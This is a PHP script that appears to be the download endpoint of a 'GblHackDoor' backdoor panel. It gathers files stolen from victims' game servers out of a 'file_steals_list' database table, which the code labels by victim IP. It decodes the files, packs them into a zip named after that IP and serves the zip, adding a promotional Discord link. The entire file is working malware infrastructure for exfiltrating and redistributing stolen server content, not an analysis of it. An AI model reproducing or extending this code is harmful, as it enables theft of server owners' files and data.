<?php
header('Content-Type: application/octet-stream');
include('../class/include.php');
if($_GET['ip'] == 0 || $_GET['ik'] != 45133722 || !Account::isAuthentified()){
    die("Il y a rien ici mec desol");
}
$all_fsdl_predata = Server::GetAllFileStealtodl();
$ipl = $GLOBALS['DB']->GetContent('file_steals_list', ['id' => $_GET['ip']])[0]['ip'];

$zip = new ZipArchive;

$zip->open($ipl.'filesteal.zip', ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE);
$zip->addFromString("filesteal_with_GHACKDOOR.txt", "https://discord.gg/FJhpQHC FileSteal fait par GblHackDoor");

foreach ($all_fsdl_predata as $data)
{    
    if($data['ip'] == $ipl){

        if(stripos($data['name'], ".vtf") !== false || stripos($data['name'], ".vmt") !== false || stripos($data['name'], ".png") !== false || stripos($data['name'], ".pcf") !== false || stripos($data['name'], ".ztmp") !== false || stripos($data['name'], ".vtx") !== false || stripos($data['name'], ".mdl") !== false || stripos($data['name'], ".phy") !== false || stripos($data['name'], ".vvd") !== false || stripos($data['name'], ".mp3") !== false || stripos($data['name'], ".wav") !== false) {

            $zip->addEmptyDir($data['folder']);

            $zip->addFromString($data['folder'].$data['name'], html_entity_decode(base64_decode($data['content'])));

            $zip->addFile("/".$data['folder'].$data['name']);

        }else{


            $zip->addEmptyDir($data['folder']);

            $zip->addFromString($data['folder'].$data['name'], html_entity_decode($data['content']));

            $zip->addFile("/".$data['folder'].$data['name']);

             }
 
    }
}

$zip->close();


header('Content-Length: ' . filesize($ipl."filesteal.zip"));
readfile($ipl."filesteal.zip");
?>
